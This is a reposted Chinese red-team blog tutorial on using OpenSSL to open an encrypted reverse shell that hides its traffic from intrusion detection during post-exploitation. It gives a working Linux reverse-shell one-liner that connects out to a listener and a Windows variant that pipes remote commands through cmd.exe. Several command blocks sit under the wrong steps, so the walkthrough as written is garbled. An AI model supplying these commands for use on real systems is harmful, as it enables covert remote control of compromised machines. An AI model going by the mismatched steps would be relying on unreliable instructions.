> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HejY3qcBqt3Mr88TcjlKaw)

**博客：**HeyComputer  

**Referrence:https://xax007.github.io/2019-03-07-reverse-encrypted-shell-with-openssl/  
**

目录
--

*   前言
    
*   OpenSSL 简介
    
*   使用 OpenSSL 生成证书自签名证书
    
*   使用 OpenSSL 反弹加密 shell
    

*   Linux
    
*   Windows
    

*   使用 OpenSSL 搭建简易 HTTPS Server
    
*   参考链接
    

**1. 前言**
---------

    在进行红队渗透测试的后渗透阶段为了进一步横行渗透往往需要反弹 shell，这里列出了使用各种语言进行反弹 shell 的方法，我发现这种反弹 shell 方式都有一个缺点，那就是**所有的流量都是明文传输的**。

    我们使用 nc 反弹 shell 进行测试

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3jodOBG2jeGKIehFVS2CDgq7DY523mIh6U6YOASm9k8yU13cRtACaPwoA/640?wx_fmt=png)

       使用 wireshark 可以直接看到我们执行的命令和返回信息

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3joBoKRs0bVC3Vm3xfE5P5iby7UTHy9lnyv7bn4cAMc4siaPKQPGnqibZtsA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3jofDlkfoicxfric2HWnIcox6A78Jllj9hB0ZtcCOqOV67SdiajdNPiag5YWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3joOkeyCgGovBgpedyoXpOVx4hsduacT8GoTIsmticvlLoHiawEuulXicuJA/640?wx_fmt=png)

    在这种情况下当我们进行操作时，网络防御检测系统 (IDS、IPS 等) 会获取到我们的通信内容并进行告警和阻止，因此需要对通信内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密 shell。

**2. OpenSSL 简介**
-----------------

    在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份

利用 OpenSSL 反弹 shell 之前需要生成自签名证书

使用 OpenSSL 生成证书自签名证书
--------------------

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
```

生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车

**3. 使用 OpenSSL 反弹加密 shell**
----------------------------

### **3.1  Linux**

      假设我们从 A 主机反弹 shell 到 B 主机

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.1.174:1337 > /tmp/s; rm /tmp/s
```

      首先需用利用上一步生成的自签名证书，在 B 主机上使用 OpenSSL 监听一个端口，在这里使用 1337 端口

命令为：

```
openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]
```

     此时 OpenSSL 在 1337 端口上启动了一个 SSL/TLS server

     这时在 B 主机进行反弹 shell 操作，命令为：

```
openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1]
```

     这样就使用 OpenSSL 反弹了一个加密的 shell

     效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3joz0XmLha9QSa479GAFwt4cHkztFlnR4sZF0HnEUrtG6dLleuH7DKtiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3jo8cNI5mvwAcm8ibMXvo2Smib5UhsyqFzkucLYU0obB0ChqzhF25kFBJJA/640?wx_fmt=png)

### **3.2 Windows**

    在 Windows 系统上反弹加密 shell 的方式有点不一样

    具体命令如下：

```
openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]
```

    以上命令会从 `[ip]:[port1]` 获取命令发送给 `cmd.exe`执行，然后把结果返回到 `[ip]:[port2]`

    因此在本机需要启动两个 `s_server`

    从 `port1` 发送命令到 cmd

```
openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW
```

    从 `port2` 获取发送给 `port1` 的命令执行结果

```
openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]
```

    OpenSSL 还有很多功能，这里详细的列出了 OpenSSL 的常见使用方法

    在渗透测试时，还可以使用 OpenSSL 搭建简易 HTTPS Server

**4. 使用 OpenSSL 搭建简易 HTTPS Server**
-----------------------------------

     使用以下命令前需要使用 OpenSSL 生成证书自签名证书，命令在上文中已给出

```
openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW
```

      以上命令在 44330 端口启动了一个 HTTPS Server  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icm7702wFBBJmAy5hibVxP3joicCOszbLPOswUVvByIljWH2U4c8W183LicL3sooj2fUYGpic6ibialtISKQ/640?wx_fmt=png)

**参考链接**
--------

*   Reverse Shell with OpenSSL
    
*   Create a simple HTTPS server with OPENSSL S_SERVER
    
*   OpenSSL == NC
    

原文链接：https://www.cnblogs.com/heycomputer/articles/10697865.html

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**